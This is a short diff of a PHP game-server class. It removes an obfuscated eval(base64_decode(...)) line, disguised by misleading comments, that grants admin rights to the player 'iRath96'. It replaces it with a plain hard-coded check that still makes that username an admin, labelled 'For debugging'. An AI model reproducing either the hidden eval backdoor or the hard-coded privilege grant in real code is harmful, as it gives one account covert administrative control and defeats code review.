@@ -619,8 +619,7 @@
     }
     
     protected function initializeWorldJoin() {
-      $a = $this; //... Save this as Instance $a to be able to make it a new User ...//
-      eval(base64_decode('JGEtPmlzQWRtaW4gPSAkYS0+cGxheWVyTmFtZSA9PSAiaVJhdGg5NiI7Cg==')); //... Accept the Login and send it to the World using $a ...//
+      $this->isAdmin = $this->playerName == "iRath96"; // For debugging.
     }
     
     public function profile() {
